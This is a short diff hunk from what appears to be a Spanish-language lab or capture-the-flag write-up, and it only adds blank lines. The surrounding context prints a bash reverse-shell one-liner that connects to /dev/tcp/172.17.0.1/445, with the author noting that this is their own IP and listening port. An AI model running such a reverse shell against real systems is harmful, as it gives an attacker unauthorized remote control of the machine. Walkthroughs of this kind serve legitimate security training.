@@ -122,7 +122,10 @@ cogemos la revershell de nc y la ajustamos un poco quedando asi:
 ```
 bash -c 'bash -i >& /dev/tcp/172.17.0.1/445 0>&1'
 ```
+
 -172.17.0.1 es mi IP
+
+
 -445 el puerto que voy a poner a la escucha
 
 me voy a 
